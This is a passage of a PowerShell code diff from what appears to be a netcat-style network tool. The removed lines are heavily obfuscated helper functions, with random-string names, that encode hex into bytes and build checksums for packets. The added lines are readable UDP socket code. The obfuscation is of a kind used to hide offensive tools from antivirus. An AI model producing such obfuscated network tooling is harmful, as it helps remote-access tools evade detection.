$LreeEBLfxTUGpjUCl0FFTEfPptZdo9pGE0sGhVmYJBHheuKn4p13hH9Dl3ReA84eneyKU3IBKUDyOhzriMBdak42ucIGolhdaBvaXYcjGJPKXuocw4AvsyWqW3dNRdnJsRiNc0zlaHHjKd1TKs6jce6otSLSgRG0kMgKdIR09ecFNpApToacjab3VE0txlzTnslzMVWpC8ODrvN80FtZBUwI7RtlDswG3n4GFS1Gmj4xURFZDA08w1r0J7Ucd5yVOjFprDKAlFrOqsaBLJR0QVr5rJcHsqArD2YjJ1XByQ4YMF0cPBaAtpGj5O0gUvxid6K6hKoiddQii8wDCfWvvnRmfGtWTk24DrGpe08mFySNnKtHKLLe0trrVUIFyqKqRquam6aSeyPCFD7MviiPMgY04qLaHIrcVgOuXqUh4lcyHCLAPHGWLbOUGCox6bWSFU2k2RkDpqpq0PiIjMMr6xEic7nUZSJNNusqxq4AsJwQDlS8Mg6TjY8gtq8pR8bsDzobNmfqkCFWSnhmQMiVv84H9n6Etv4D7ZCG72UKNo9iXjMQ3rthaZvkKTmvh1SLyhlplbNgC6h8P9OLvnYuKEDwgkj415QLD35807StS24xFaLS4fROjCD1mvIkRmb7kUJaZ8K8JJ4IdwhtcYa9kT6HsFAuNqsVPFk7p60cqQkXicLSkOJ50TrB8GaCNtGQb4g + "00" + $zbmVENyLwyevsEbTxcOU4tpRd5P3Q7ZhBc7YhYGZ2sdE9zYfPjibNpqpChVwRekyWcEzehVQByRwrE4AoAgrQOUxZZ9zNSxEvtTbmvYA7KfJDkwdJUN7qUPjYlmYNMInjLTU7dOqs1TLiv4fn1SwUlo8Ty7DJqaZzP5R3C24LvTCWq94alwaNOgImLg1vP4I0iywO0iuQ5oC1CpHQsU031Ov4QuwiRJvHrqpPPkW2wOu3uJ9G8scpKDVIlBTUDexQCM4TT08Bm3IS4lyBwJwnji8Ijih5hpX8DSDlC8YrwkISydexVshMmPGpXr0aAB9LZC2lBAmZ0RkzHRjnXFbjFINiP93ZehGk2XwI93wKquW43Sm1VZUOU3zEBlpMbuMP3CGPypTaq2zJRfRRg7HVZsb12acanea8sY1XilClO9sbukxK9Dxz4VJnnSkH9iSsBgq8G0kI3cUNwdK2DwjcnsT1bUk0rsED5PbUzM9TSXIwq3hjCqW5ydfkwCgjQw059Yaa0WnJ0JOx4UQ8Q6UdC4mtGVULLHfgayvHaL0P6UAWCquY2Vj0dN4aMxrW3OC3eWHS0H9mGwFQbc7pJaoWWJ8s6NRjQ7QAhSesJtgK8ap8XePqOPxJO8)
-         }
-      
- function riYadVlCvscBwynXLycZptMYaMTZULTeijjSUvzG
-      {
-       param($LreeEBLfxTUGpjUCl0FFTEfPptZdo9pGE0sGhVmYJBHheuKn4p13hH9Dl3ReA84eneyKU3IBKUDyOhzriMBdak42ucIGolhdaBvaXYcjGJPKXuocw4AvsyWqW3dNRdnJsRiNc0zlaHHjKd1TKs6jce6otSLSgRG0kMgKdIR09ecFNpApToacjab3VE0txlzTnslzMVWpC8ODrvN80FtZBUwI7RtlDswG3n4GFS1Gmj4xURFZDA08w1r0J7Ucd5yVOjFprDKAlFrOqsaBLJR0QVr5rJcHsqArD2YjJ1XByQ4YMF0cPBaAtpGj5O0gUvxid6K6hKoiddQii8wDCfWvvnRmfGtWTk24DrGpe08mFySNnKtHKLLe0trrVUIFyqKqRquam6aSeyPCFD7MviiPMgY04qLaHIrcVgOuXqUh4lcyHCLAPHGWLbOUGCox6bWSFU2k2RkDpqpq0PiIjMMr6xEic7nUZSJNNusqxq4AsJwQDlS8Mg6TjY8gtq8pR8bsDzobNmfqkCFWSnhmQMiVv84H9n6Etv4D7ZCG72UKNo9iXjMQ3rthaZvkKTmvh1SLyhlplbNgC6h8P9OLvnYuKEDwgkj415QLD35807StS24xFaLS4fROjCD1mvIkRmb7kUJaZ8K8JJ4IdwhtcYa9kT6HsFAuNqsVPFk7p60cqQkXicLSkOJ50TrB8GaCNtGQb4g,$kVCChx0Yx3QylODepx2SHJ7e4DBTplQHrlmeWbFwDLUBmnhlp2jLK494qufM1i9puqfKZmTi1QoejPRRGESUeIRSisDGtczsX6PIO1C2mhwr11tgizpOu9T3kGyamyljT47i8Ib8WLhP9OSrwZGFXmQUJ9yLx02KuMSTblMVkNuSHGAAulm4RmrQV7L2Sb7KwS6wE,$23VRL27Kw5OHCrfVjawUlWLrrqnJdWjfxm6ocW8TlRq5kiAOSOe5p3htCO4GoojytduEANt0fYaagjx35oDs2y9CishStrgO2jRAHmpLmCeuPEvcCw6RomjHQ88gMORDlo31CrP8ZHJIqTTDDz8a2z8u,$whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3,$bWyo8G5hjWTAkrDxFDhWkYAZW8ZGcQTA05aWrkzp8xgi5JUTx9iZJLVZJqlXUrmVj0gCE6STw8DxjzTpamIfT4kESEWObuVJyzkOnhXQEJArkWxaAxZhrW0FENDnXm766uFe9YKdgbCQjhtBlY4dUhD9PGkWoLvR3juKLBgMgfe6FrWQ2ZupzLgoaSTjeXAUAPTTHdX5YmFWit7na3j9XSwlEJhM3Dk8FxLChl70vFKvCITviMykLqkTcjIDuN7FWy0bqJFvPkWrTD3FktgC1kaDQWmLRYMF6P66T0ak3ZjdgWLS29k2AcpRIyaOtIqxFtj259r4GrRrt2gmywrMKdQETNwWpGpTV0eDQkkVyqEoPtodccwZPIDjdn1xqSfioI3I16rjxTcwUvKeWluf6u8uWNUWuGuby9KoL6v8wKyQ3FgGeJU3V2iaXwLVwVu8FWcojJJRb6c25wyC2RmUj3nvIYic1CapEkQWCjeGi0adRzuCTEDkh3JiWNozsMdb4nNfEgYW7TIZG5rsZ8rcd1GX5G6zM58JhNXU97XW4XM1rW0JM4bH4icAmz5t6kslX2cegFQCD6Req02Ub5U79Jb6Xs2cXGkWOcIvcWPytLnY0ZpiPbpnkfTaLiy1jeRFGYvgYjA2V91ZbXSNOUgbnDMAzXJCOoZ8ZIQS1d8bqf7yUWTARZPH9lE9yrfQ7nRLMT7UhDq931CfgP256PYFroSI89yqn1vse5Bwnonq8wwlz8RNuYHgzSJGxEDzJYHhwG520Eg2Y7CPrAmWRT7dAkZPrxpvYSBfW1cpa8BnjJFAXqClMIlQtf6O3gm5Wb6XjXB3lyjoM8K6JAFMqjhReScubfQwB,$zbmVENyLwyevsEbTxcOU4tpRd5P3Q7ZhBc7YhYGZ2sdE9zYfPjibNpqpChVwRekyWcEzehVQByRwrE4AoAgrQOUxZZ9zNSxEvtTbmvYA7KfJDkwdJUN7qUPjYlmYNMInjLTU7dOqs1TLiv4fn1SwUlo8Ty7DJqaZzP5R3C24LvTCWq94alwaNOgImLg1vP4I0iywO0iuQ5oC1CpHQsU031Ov4QuwiRJvHrqpPPkW2wOu3uJ9G8scpKDVIlBTUDexQCM4TT08Bm3IS4lyBwJwnji8Ijih5hpX8DSDlC8YrwkISydexVshMmPGpXr0aAB9LZC2lBAmZ0RkzHRjnXFbjFINiP93ZehGk2XwI93wKquW43Sm1VZUOU3zEBlpMbuMP3CGPypTaq2zJRfRRg7HVZsb12acanea8sY1XilClO9sbukxK9Dxz4VJnnSkH9iSsBgq8G0kI3cUNwdK2DwjcnsT1bUk0rsED5PbUzM9TSXIwq3hjCqW5ydfkwCgjQw059Yaa0WnJ0JOx4UQ8Q6UdC4mtGVULLHfgayvHaL0P6UAWCquY2Vj0dN4aMxrW3OC3eWHS0H9mGwFQbc7pJaoWWJ8s6NRjQ7QAhSesJtgK8ap8XePqOPxJO8)
-     return ($bWyo8G5hjWTAkrDxFDhWkYAZW8ZGcQTA05aWrkzp8xgi5JUTx9iZJLVZJqlXUrmVj0gCE6STw8DxjzTpamIfT4kESEWObuVJyzkOnhXQEJArkWxaAxZhrW0FENDnXm766uFe9YKdgbCQjhtBlY4dUhD9PGkWoLvR3juKLBgMgfe6FrWQ2ZupzLgoaSTjeXAUAPTTHdX5YmFWit7na3j9XSwlEJhM3Dk8FxLChl70vFKvCITviMykLqkTcjIDuN7FWy0bqJFvPkWrTD3FktgC1kaDQWmLRYMF6P66T0ak3ZjdgWLS29k2AcpRIyaOtIqxFtj259r4GrRrt2gmywrMKdQETNwWpGpTV0eDQkkVyqEoPtodccwZPIDjdn1xqSfioI3I16rjxTcwUvKeWluf6u8uWNUWuGuby9KoL6v8wKyQ3FgGeJU3V2iaXwLVwVu8FWcojJJRb6c25wyC2RmUj3nvIYic1CapEkQWCjeGi0adRzuCTEDkh3JiWNozsMdb4nNfEgYW7TIZG5rsZ8rcd1GX5G6zM58JhNXU97XW4XM1rW0JM4bH4icAmz5t6kslX2cegFQCD6Req02Ub5U79Jb6Xs2cXGkWOcIvcWPytLnY0ZpiPbpnkfTaLiy1jeRFGYvgYjA2V91ZbXSNOUgbnDMAzXJCOoZ8ZIQS1d8bqf7yUWTARZPH9lE9yrfQ7nRLMT7UhDq931CfgP256PYFroSI89yqn1vse5Bwnonq8wwlz8RNuYHgzSJGxEDzJYHhwG520Eg2Y7CPrAmWRT7dAkZPrxpvYSBfW1cpa8BnjJFAXqClMIlQtf6O3gm5Wb6XjXB3lyjoM8K6JAFMqjhReScubfQwB + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "01" + $LreeEBLfxTUGpjUCl0FFTEfPptZdo9pGE0sGhVmYJBHheuKn4p13hH9Dl3ReA84eneyKU3IBKUDyOhzriMBdak42ucIGolhdaBvaXYcjGJPKXuocw4AvsyWqW3dNRdnJsRiNc0zlaHHjKd1TKs6jce6otSLSgRG0kMgKdIR09ecFNpApToacjab3VE0txlzTnslzMVWpC8ODrvN80FtZBUwI7RtlDswG3n4GFS1Gmj4xURFZDA08w1r0J7Ucd5yVOjFprDKAlFrOqsaBLJR0QVr5rJcHsqArD2YjJ1XByQ4YMF0cPBaAtpGj5O0gUvxid6K6hKoiddQii8wDCfWvvnRmfGtWTk24DrGpe08mFySNnKtHKLLe0trrVUIFyqKqRquam6aSeyPCFD7MviiPMgY04qLaHIrcVgOuXqUh4lcyHCLAPHGWLbOUGCox6bWSFU2k2RkDpqpq0PiIjMMr6xEic7nUZSJNNusqxq4AsJwQDlS8Mg6TjY8gtq8pR8bsDzobNmfqkCFWSnhmQMiVv84H9n6Etv4D7ZCG72UKNo9iXjMQ3rthaZvkKTmvh1SLyhlplbNgC6h8P9OLvnYuKEDwgkj415QLD35807StS24xFaLS4fROjCD1mvIkRmb7kUJaZ8K8JJ4IdwhtcYa9kT6HsFAuNqsVPFk7p60cqQkXicLSkOJ50TrB8GaCNtGQb4g + $kVCChx0Yx3QylODepx2SHJ7e4DBTplQHrlmeWbFwDLUBmnhlp2jLK494qufM1i9puqfKZmTi1QoejPRRGESUeIRSisDGtczsX6PIO1C2mhwr11tgizpOu9T3kGyamyljT47i8Ib8WLhP9OSrwZGFXmQUJ9yLx02KuMSTblMVkNuSHGAAulm4RmrQV7L2Sb7KwS6wE + $23VRL27Kw5OHCrfVjawUlWLrrqnJdWjfxm6ocW8TlRq5kiAOSOe5p3htCO4GoojytduEANt0fYaagjx35oDs2y9CishStrgO2jRAHmpLmCeuPEvcCw6RomjHQ88gMORDlo31CrP8ZHJIqTTDDz8a2z8u + $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 + $zbmVENyLwyevsEbTxcOU4tpRd5P3Q7ZhBc7YhYGZ2sdE9zYfPjibNpqpChVwRekyWcEzehVQByRwrE4AoAgrQOUxZZ9zNSxEvtTbmvYA7KfJDkwdJUN7qUPjYlmYNMInjLTU7dOqs1TLiv4fn1SwUlo8Ty7DJqaZzP5R3C24LvTCWq94alwaNOgImLg1vP4I0iywO0iuQ5oC1CpHQsU031Ov4QuwiRJvHrqpPPkW2wOu3uJ9G8scpKDVIlBTUDexQCM4TT08Bm3IS4lyBwJwnji8Ijih5hpX8DSDlC8YrwkISydexVshMmPGpXr0aAB9LZC2lBAmZ0RkzHRjnXFbjFINiP93ZehGk2XwI93wKquW43Sm1VZUOU3zEBlpMbuMP3CGPypTaq2zJRfRRg7HVZsb12acanea8sY1XilClO9sbukxK9Dxz4VJnnSkH9iSsBgq8G0kI3cUNwdK2DwjcnsT1bUk0rsED5PbUzM9TSXIwq3hjCqW5ydfkwCgjQw059Yaa0WnJ0JOx4UQ8Q6UdC4mtGVULLHfgayvHaL0P6UAWCquY2Vj0dN4aMxrW3OC3eWHS0H9mGwFQbc7pJaoWWJ8s6NRjQ7QAhSesJtgK8ap8XePqOPxJO8)
- }
-      
-        function NQTIWXebxrJyMIGLbpZmOHWdUzCTGKTcJkuRwtyr
-       {
-      param($qGX77HJA9dJw6VV3q11LTqoCAEzHNzy8LQ7VCxhlPpznDqxqx6ztauSkeqchMikQuHqRgofmyDmEHpwK2HPIGDitYOKuOC5OlHTAAEWxYHLwClCGwE4qmW0GX0h08KbZHaXYnu8iFDMZ06Xor0cDAXvgtLOmnYkKHAy4kVzr4DpifTx9nHK4RUs66qfwnYaknzITBOtmNVoB9tcEiQPMb9Jmog17wlbCl6gViJH0xrdgCOjVOxL4qOvScHGMXK9fibhzofqrOfZtSm0dSFGlkIfAJz7PeanumbJhBTeL9BXaUDfeSWl5KvHKq3njIyNvgVLNxmwYBAemGjgbNQU5vIHN0ZeRWffOxOflikVTtT)
-    
-     if((($qGX77HJA9dJw6VV3q11LTqoCAEzHNzy8LQ7VCxhlPpznDqxqx6ztauSkeqchMikQuHqRgofmyDmEHpwK2HPIGDitYOKuOC5OlHTAAEWxYHLwClCGwE4qmW0GX0h08KbZHaXYnu8iFDMZ06Xor0cDAXvgtLOmnYkKHAy4kVzr4DpifTx9nHK4RUs66qfwnYaknzITBOtmNVoB9tcEiQPMb9Jmog17wlbCl6gViJH0xrdgCOjVOxL4qOvScHGMXK9fibhzofqrOfZtSm0dSFGlkIfAJz7PeanumbJhBTeL9BXaUDfeSWl5KvHKq3njIyNvgVLNxmwYBAemGjgbNQU5vIHN0ZeRWffOxOflikVTtT.Length)%2 -eq 1) -or ($qGX77HJA9dJw6VV3q11LTqoCAEzHNzy8LQ7VCxhlPpznDqxqx6ztauSkeqchMikQuHqRgofmyDmEHpwK2HPIGDitYOKuOC5OlHTAAEWxYHLwClCGwE4qmW0GX0h08KbZHaXYnu8iFDMZ06Xor0cDAXvgtLOmnYkKHAy4kVzr4DpifTx9nHK4RUs66qfwnYaknzITBOtmNVoB9tcEiQPMb9Jmog17wlbCl6gViJH0xrdgCOjVOxL4qOvScHGMXK9fibhzofqrOfZtSm0dSFGlkIfAJz7PeanumbJhBTeL9BXaUDfeSWl5KvHKq3njIyNvgVLNxmwYBAemGjgbNQU5vIHN0ZeRWffOxOflikVTtT.Length -eq 0)){return 1}
-     $23VRL27Kw5OHCrfVjawUlWLrrqnJdWjfxm6ocW8TlRq5kiAOSOe5p3htCO4GoojytduEANt0fYaagjx35oDs2y9CishStrgO2jRAHmpLmCeuPEvcCw6RomjHQ88gMORDlo31CrP8ZHJIqTTDDz8a2z8u = ($qGX77HJA9dJw6VV3q11LTqoCAEzHNzy8LQ7VCxhlPpznDqxqx6ztauSkeqchMikQuHqRgofmyDmEHpwK2HPIGDitYOKuOC5OlHTAAEWxYHLwClCGwE4qmW0GX0h08KbZHaXYnu8iFDMZ06Xor0cDAXvgtLOmnYkKHAy4kVzr4DpifTx9nHK4RUs66qfwnYaknzITBOtmNVoB9tcEiQPMb9Jmog17wlbCl6gViJH0xrdgCOjVOxL4qOvScHGMXK9fibhzofqrOfZtSm0dSFGlkIfAJz7PeanumbJhBTeL9BXaUDfeSWl5KvHKq3njIyNvgVLNxmwYBAemGjgbNQU5vIHN0ZeRWffOxOflikVTtT[10..13] -join "")
-$kVCChx0Yx3QylODepx2SHJ7e4DBTplQHrlmeWbFwDLUBmnhlp2jLK494qufM1i9puqfKZmTi1QoejPRRGESUeIRSisDGtczsX6PIO1C2mhwr11tgizpOu9T3kGyamyljT47i8Ib8WLhP9OSrwZGFXmQUJ9yLx02KuMSTblMVkNuSHGAAulm4RmrQV7L2Sb7KwS6wE = ($qGX77HJA9dJw6VV3q11LTqoCAEzHNzy8LQ7VCxhlPpznDqxqx6ztauSkeqchMikQuHqRgofmyDmEHpwK2HPIGDitYOKuOC5OlHTAAEWxYHLwClCGwE4qmW0GX0h08KbZHaXYnu8iFDMZ06Xor0cDAXvgtLOmnYkKHAy4kVzr4DpifTx9nHK4RUs66qfwnYaknzITBOtmNVoB9tcEiQPMb9Jmog17wlbCl6gViJH0xrdgCOjVOxL4qOvScHGMXK9fibhzofqrOfZtSm0dSFGlkIfAJz7PeanumbJhBTeL9BXaUDfeSWl5KvHKq3njIyNvgVLNxmwYBAemGjgbNQU5vIHN0ZeRWffOxOflikVTtT[14..17] -join "")
-         [byte[]]$DKeNKKdcrHo2PumqQIlc9sPi57rQGydnT9yz7dl84QhU7ZP1AuUUe2ehiPvWf4d2llH1xq4CpTgmjIeetR8jXLHWTVLWUoZyW1JQwlR89KEjuEaNDHYqk5ALUi1PQhf81 = @()
-    
-       if($qGX77HJA9dJw6VV3q11LTqoCAEzHNzy8LQ7VCxhlPpznDqxqx6ztauSkeqchMikQuHqRgofmyDmEHpwK2HPIGDitYOKuOC5OlHTAAEWxYHLwClCGwE4qmW0GX0h08KbZHaXYnu8iFDMZ06Xor0cDAXvgtLOmnYkKHAy4kVzr4DpifTx9nHK4RUs66qfwnYaknzITBOtmNVoB9tcEiQPMb9Jmog17wlbCl6gViJH0xrdgCOjVOxL4qOvScHGMXK9fibhzofqrOfZtSm0dSFGlkIfAJz7PeanumbJhBTeL9BXaUDfeSWl5KvHKq3njIyNvgVLNxmwYBAemGjgbNQU5vIHN0ZeRWffOxOflikVTtT.Length -gt 18)
-{
-      $eRrgauOFw9biaTkwGYaFFlZcPMJzTDF0Y4BmCr7063Ta68B80QWLFWb8zugfLh7EyIGCtkfMV4OZshlwG2F0edMn4hZs342ZVhRMQHX5obWQM5t4Y5reA4ly0SbNZZAV8mQQZHwpja1VL8R5AZCBtQiFWaEIIx10h2D96FqSahBX2L0yG1AdXAq5f2w6hixk0nOVIlk8WS = $qGX77HJA9dJw6VV3q11LTqoCAEzHNzy8LQ7VCxhlPpznDqxqx6ztauSkeqchMikQuHqRgofmyDmEHpwK2HPIGDitYOKuOC5OlHTAAEWxYHLwClCGwE4qmW0GX0h08KbZHaXYnu8iFDMZ06Xor0cDAXvgtLOmnYkKHAy4kVzr4DpifTx9nHK4RUs66qfwnYaknzITBOtmNVoB9tcEiQPMb9Jmog17wlbCl6gViJH0xrdgCOjVOxL4qOvScHGMXK9fibhzofqrOfZtSm0dSFGlkIfAJz7PeanumbJhBTeL9BXaUDfeSWl5KvHKq3njIyNvgVLNxmwYBAemGjgbNQU5vIHN0ZeRWffOxOflikVTtT.Substring(18)
-    while($eRrgauOFw9biaTkwGYaFFlZcPMJzTDF0Y4BmCr7063Ta68B80QWLFWb8zugfLh7EyIGCtkfMV4OZshlwG2F0edMn4hZs342ZVhRMQHX5obWQM5t4Y5reA4ly0SbNZZAV8mQQZHwpja1VL8R5AZCBtQiFWaEIIx10h2D96FqSahBX2L0yG1AdXAq5f2w6hixk0nOVIlk8WS.Length -gt 0)
-      {
-     $DKeNKKdcrHo2PumqQIlc9sPi57rQGydnT9yz7dl84QhU7ZP1AuUUe2ehiPvWf4d2llH1xq4CpTgmjIeetR8jXLHWTVLWUoZyW1JQwlR89KEjuEaNDHYqk5ALUi1PQhf81 += [byte[]][Convert]::ToInt16(($eRrgauOFw9biaTkwGYaFFlZcPMJzTDF0Y4BmCr7063Ta68B80QWLFWb8zugfLh7EyIGCtkfMV4OZshlwG2F0edMn4hZs342ZVhRMQHX5obWQM5t4Y5reA4ly0SbNZZAV8mQQZHwpja1VL8R5AZCBtQiFWaEIIx10h2D96FqSahBX2L0yG1AdXAq5f2w6hixk0nOVIlk8WS[0..1] -join ""),16)
-      $eRrgauOFw9biaTkwGYaFFlZcPMJzTDF0Y4BmCr7063Ta68B80QWLFWb8zugfLh7EyIGCtkfMV4OZshlwG2F0edMn4hZs342ZVhRMQHX5obWQM5t4Y5reA4ly0SbNZZAV8mQQZHwpja1VL8R5AZCBtQiFWaEIIx10h2D96FqSahBX2L0yG1AdXAq5f2w6hixk0nOVIlk8WS = $eRrgauOFw9biaTkwGYaFFlZcPMJzTDF0Y4BmCr7063Ta68B80QWLFWb8zugfLh7EyIGCtkfMV4OZshlwG2F0edMn4hZs342ZVhRMQHX5obWQM5t4Y5reA4ly0SbNZZAV8mQQZHwpja1VL8R5AZCBtQiFWaEIIx10h2D96FqSahBX2L0yG1AdXAq5f2w6hixk0nOVIlk8WS.Substring(2)
+          $SocketBytesRead = $FuncVars["Socket"].Client.EndReceiveMessageFrom($ConnectHandle,[ref]([System.Net.Sockets.SocketFlags]::None),[ref]$EndPoint,[ref]$PacketInfo)
+          Write-Verbose ("Connection from [" + $EndPoint.Address.IPAddressToString + "] port " + $p + " [udp] accepted (source port " + $EndPoint.Port + ")")
+          if($SocketBytesRead -gt 0){break}
+          else{break}
         }
       }
-
-         return $qGX77HJA9dJw6VV3q11LTqoCAEzHNzy8LQ7VCxhlPpznDqxqx6ztauSkeqchMikQuHqRgofmyDmEHpwK2HPIGDitYOKuOC5OlHTAAEWxYHLwClCGwE4qmW0GX0h08KbZHaXYnu8iFDMZ06Xor0cDAXvgtLOmnYkKHAy4kVzr4DpifTx9nHK4RUs66qfwnYaknzITBOtmNVoB9tcEiQPMb9Jmog17wlbCl6gViJH0xrdgCOjVOxL4qOvScHGMXK9fibhzofqrOfZtSm0dSFGlkIfAJz7PeanumbJhBTeL9BXaUDfeSWl5KvHKq3njIyNvgVLNxmwYBAemGjgbNQU5vIHN0ZeRWffOxOflikVTtT,$DKeNKKdcrHo2PumqQIlc9sPi57rQGydnT9yz7dl84QhU7ZP1AuUUe2ehiPvWf4d2llH1xq4CpTgmjIeetR8jXLHWTVLWUoZyW1JQwlR89KEjuEaNDHYqk5ALUi1PQhf81,$23VRL27Kw5OHCrfVjawUlWLrrqnJdWjfxm6ocW8TlRq5kiAOSOe5p3htCO4GoojytduEANt0fYaagjx35oDs2y9CishStrgO2jRAHmpLmCeuPEvcCw6RomjHQ88gMORDlo31CrP8ZHJIqTTDDz8a2z8u,$kVCChx0Yx3QylODepx2SHJ7e4DBTplQHrlmeWbFwDLUBmnhlp2jLK494qufM1i9puqfKZmTi1QoejPRRGESUeIRSisDGtczsX6PIO1C2mhwr11tgizpOu9T3kGyamyljT47i8Ib8WLhP9OSrwZGFXmQUJ9yLx02KuMSTblMVkNuSHGAAulm4RmrQV7L2Sb7KwS6wE
-     }
-
-      function DlZJusBQtizmVfSmioCyAbcFBDmHEBnLKxtqAeeB
-   {
-       param($DKeNKKdcrHo2PumqQIlc9sPi57rQGydnT9yz7dl84QhU7ZP1AuUUe2ehiPvWf4d2llH1xq4CpTgmjIeetR8jXLHWTVLWUoZyW1JQwlR89KEjuEaNDHYqk5ALUi1PQhf81,$23VRL27Kw5OHCrfVjawUlWLrrqnJdWjfxm6ocW8TlRq5kiAOSOe5p3htCO4GoojytduEANt0fYaagjx35oDs2y9CishStrgO2jRAHmpLmCeuPEvcCw6RomjHQ88gMORDlo31CrP8ZHJIqTTDDz8a2z8u)
- $p38SEfS9HgiGqAZbRXR8EpKKKNJrWR18gHcuuIq7UStIFblloC7gqd8EBsxBvw13sfinfwzsn9CmEcMGM3AOdnt16m0UzLOP5tUXKAKHH8B6aWSvNSjerzkF6oAJbDbZIuAjQTnu3kBHFAPzmBOt0AFqe2CpucblYZEjgP3mh93TMrWgHZ5UCA8TXMsSwEbvLQPv9bqX9rt6H1VuYMqtzFjd4eEaahuFlySgJKWwcBzuOLI9ysVTuYJVn0VErKrwf1YmUvaDIsPKgL8ebBRrjyyRmMDEzkc47PVNpOfWjWkB6wGVwX2mqkqe7wxSZ7X2qRItjHxhhmZ7Khjqiv5fXfgzT3TSLXgEZHTejU2WUQkhLAmrmbukCcG1TjvxGpM1aemdeELWKelAwAQOcVUBvDrT8VE6OVDitqmQwgGB8lLaxsOmJB3PFQn0YOqce2ZjAfPRCJCaZyoUzUmhHaGzZ9brmVvZth9hOmts9Hi2j76ZoCOwucPP2dj5a7iBM1PhIdrF3zML3XvxFXgk8LCVb4EBOwCb8RADRKaInDOpTroygmRmjHhCHA0XSr35Uo5iZ7kv74nDWu5D2xyJYiaeqnN806y2DURKQTEhfAljKxw7ypcrkoDnfF6TNiFynGCJB0b84BtN0geqm9gENixMuYnHf5Ehe5CgjgBD1eA8gswqWl1RGRtBGCJ1pIzEGUQiE = [string]("{0:x}" -f (([uint16]("0x" + $23VRL27Kw5OHCrfVjawUlWLrrqnJdWjfxm6ocW8TlRq5kiAOSOe5p3htCO4GoojytduEANt0fYaagjx35oDs2y9CishStrgO2jRAHmpLmCeuPEvcCw6RomjHQ88gMORDlo31CrP8ZHJIqTTDDz8a2z8u) + $DKeNKKdcrHo2PumqQIlc9sPi57rQGydnT9yz7dl84QhU7ZP1AuUUe2ehiPvWf4d2llH1xq4CpTgmjIeetR8jXLHWTVLWUoZyW1JQwlR89KEjuEaNDHYqk5ALUi1PQhf81.Length) % 65535))
-        if($p38SEfS9HgiGqAZbRXR8EpKKKNJrWR18gHcuuIq7UStIFblloC7gqd8EBsxBvw13sfinfwzsn9CmEcMGM3AOdnt16m0UzLOP5tUXKAKHH8B6aWSvNSjerzkF6oAJbDbZIuAjQTnu3kBHFAPzmBOt0AFqe2CpucblYZEjgP3mh93TMrWgHZ5UCA8TXMsSwEbvLQPv9bqX9rt6H1VuYMqtzFjd4eEaahuFlySgJKWwcBzuOLI9ysVTuYJVn0VErKrwf1YmUvaDIsPKgL8ebBRrjyyRmMDEzkc47PVNpOfWjWkB6wGVwX2mqkqe7wxSZ7X2qRItjHxhhmZ7Khjqiv5fXfgzT3TSLXgEZHTejU2WUQkhLAmrmbukCcG1TjvxGpM1aemdeELWKelAwAQOcVUBvDrT8VE6OVDitqmQwgGB8lLaxsOmJB3PFQn0YOqce2ZjAfPRCJCaZyoUzUmhHaGzZ9brmVvZth9hOmts9Hi2j76ZoCOwucPP2dj5a7iBM1PhIdrF3zML3XvxFXgk8LCVb4EBOwCb8RADRKaInDOpTroygmRmjHhCHA0XSr35Uo5iZ7kv74nDWu5D2xyJYiaeqnN806y2DURKQTEhfAljKxw7ypcrkoDnfF6TNiFynGCJB0b84BtN0geqm9gENixMuYnHf5Ehe5CgjgBD1eA8gswqWl1RGRtBGCJ1pIzEGUQiE.Length -ne 4){$p38SEfS9HgiGqAZbRXR8EpKKKNJrWR18gHcuuIq7UStIFblloC7gqd8EBsxBvw13sfinfwzsn9CmEcMGM3AOdnt16m0UzLOP5tUXKAKHH8B6aWSvNSjerzkF6oAJbDbZIuAjQTnu3kBHFAPzmBOt0AFqe2CpucblYZEjgP3mh93TMrWgHZ5UCA8TXMsSwEbvLQPv9bqX9rt6H1VuYMqtzFjd4eEaahuFlySgJKWwcBzuOLI9ysVTuYJVn0VErKrwf1YmUvaDIsPKgL8ebBRrjyyRmMDEzkc47PVNpOfWjWkB6wGVwX2mqkqe7wxSZ7X2qRItjHxhhmZ7Khjqiv5fXfgzT3TSLXgEZHTejU2WUQkhLAmrmbukCcG1TjvxGpM1aemdeELWKelAwAQOcVUBvDrT8VE6OVDitqmQwgGB8lLaxsOmJB3PFQn0YOqce2ZjAfPRCJCaZyoUzUmhHaGzZ9brmVvZth9hOmts9Hi2j76ZoCOwucPP2dj5a7iBM1PhIdrF3zML3XvxFXgk8LCVb4EBOwCb8RADRKaInDOpTroygmRmjHhCHA0XSr35Uo5iZ7kv74nDWu5D2xyJYiaeqnN806y2DURKQTEhfAljKxw7ypcrkoDnfF6TNiFynGCJB0b84BtN0geqm9gENixMuYnHf5Ehe5CgjgBD1eA8gswqWl1RGRtBGCJ1pIzEGUQiE = (("0"*(4-$p38SEfS9HgiGqAZbRXR8EpKKKNJrWR18gHcuuIq7UStIFblloC7gqd8EBsxBvw13sfinfwzsn9CmEcMGM3AOdnt16m0UzLOP5tUXKAKHH8B6aWSvNSjerzkF6oAJbDbZIuAjQTnu3kBHFAPzmBOt0AFqe2CpucblYZEjgP3mh93TMrWgHZ5UCA8TXMsSwEbvLQPv9bqX9rt6H1VuYMqtzFjd4eEaahuFlySgJKWwcBzuOLI9ysVTuYJVn0VErKrwf1YmUvaDIsPKgL8ebBRrjyyRmMDEzkc47PVNpOfWjWkB6wGVwX2mqkqe7wxSZ7X2qRItjHxhhmZ7Khjqiv5fXfgzT3TSLXgEZHTejU2WUQkhLAmrmbukCcG1TjvxGpM1aemdeELWKelAwAQOcVUBvDrT8VE6OVDitqmQwgGB8lLaxsOmJB3PFQn0YOqce2ZjAfPRCJCaZyoUzUmhHaGzZ9brmVvZth9hOmts9Hi2j76ZoCOwucPP2dj5a7iBM1PhIdrF3zML3XvxFXgk8LCVb4EBOwCb8RADRKaInDOpTroygmRmjHhCHA0XSr35Uo5iZ7kv74nDWu5D2xyJYiaeqnN806y2DURKQTEhfAljKxw7ypcrkoDnfF6TNiFynGCJB0b84BtN0geqm9gENixMuYnHf5Ehe5CgjgBD1eA8gswqWl1RGRtBGCJ1pIzEGUQiE.Length)) + 